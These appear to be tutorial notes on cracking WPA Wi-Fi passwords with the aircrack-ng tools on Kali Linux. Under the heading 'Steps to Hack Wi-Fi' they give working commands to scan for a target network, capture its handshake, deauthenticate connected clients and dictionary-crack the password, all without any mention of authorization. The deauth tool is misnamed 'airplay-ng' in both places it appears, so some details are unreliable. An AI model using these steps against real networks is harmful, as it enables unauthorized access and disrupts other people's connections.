### **Requirements:**

1. **Hardware Requirements:**
    
    - **Base Machine:** Kali Linux.
    - **Network Adapter:**
        - Use an **external adapter** or add a compatible one to your virtual machine.
    - **Extension Pack:** Ensure the VirtualBox Extension Pack is installed.
2. **VirtualBox Setup:**
    
    - Change the settings to add the USB (network adapter).
    - After connecting the external network adapter, you should:
        - Be able to access the internet inside the Kali machine.
        - Verify the adapter with the `ip a` command.
3. **Promiscuous Mode and Monitor Mode:**
    
    - **Promiscuous Mode:** Allows Ethernet adapters to see all packets.
    - **Monitor Mode:** Required for wireless adapters to capture packets.

### **Understanding the Wi-Fi Password Process:**

- **4-Way Handshake:**
    - A critical exchange during Wi-Fi authentication.
    - If these handshake packets are captured correctly, they can be cracked to reveal the password.

### **Tools Used:**

1. **airmon-ng:** Enables monitoring mode.
2. **airodump-ng:** Captures Wi-Fi data packets.
3. **aircrack-ng:** Cracks Wi-Fi passwords.
4. **airplay-ng:** Disconnects clients from the network to force reconnections (for EAPOL packet capture).

### **Steps to Hack Wi-Fi:**

#### **1. Enable Monitor Mode:**

1. Start monitoring mode:
    ```bash
    sudo airmon-ng
    sudo airmon-ng start wlan0
    ip a  # Verify the adapter is now in monitoring mode (e.g., wlan0mon)
    ```
#### **2. Identify the Target Wi-Fi Network:**

1. Scan for Wi-Fi networks:
    ```bash
    sudo airodump-ng --band bg wlan0
    ```
    
    - Note the **channel number** and **MAC address** of the Wi-Fi network you want to hack.

#### **3. Capture 4-Way Handshake Packets:**

1. Start packet capturing in a new terminal:
    
    ```bash
    mkdir hackwifi && cd hackwifi
    sudo airodump-ng -c <channel-number> --bssid <mac-address> -w hack wlan0mon
    ```
    
    - **Options:**
        - `-c`: Channel number of the target network.
        - `--bssid`: MAC address of the target network.
        - `-w hack`: Output filename (`hack` in this example).

#### **4. Crack the Password:**

1. **Wordlist Preparation:**
    
    - Use a pre-existing wordlist or create your own. Example:
        
        ```bash
        cp /usr/share/metasploit-framework/data/wordlists/password.lst wordlist
        ```
        
2. **Crack the Handshake Packets:**
    
    ```bash
    sudo aircrack-ng -w wordlist -b <mac-address> hack-01.cap
    ```
    
    - **Options:**
        - `-w`: Path to the wordlist.
        - `-b`: MAC address of the target Wi-Fi.
        - `hack-01.cap`: File created during handshake capture.
    - The tool scans the wordlist and reveals the password within seconds if it's present in the list.

---

#### **5. Force Client Disconnection (Optional):**

- Use `airplay-ng` to disconnect clients from the network. This forces reconnections, making it easier to capture EAPOL packets. Example:
    
    ```bash
    sudo airplay-ng -0 <number_of_deauth_packets> -a <bssid> wlan0mon
    ```

## **Extra**

### **4-Way Handshake:**

The 4-Way Handshake is a process used in Wi-Fi networks to securely connect a device to a router. Here's how it works:

1. **Purpose:** It ensures that both the router and the device know the Wi-Fi password without directly sharing it.
2. **Steps:**
    - The router sends a random number (Nonce) to the device.
    - The device uses this number and the password to create a unique response.
    - The router verifies the response.
    - Both sides agree on encryption keys for secure communication.

If you capture these handshake packets, you can use tools to crack the Wi-Fi password.
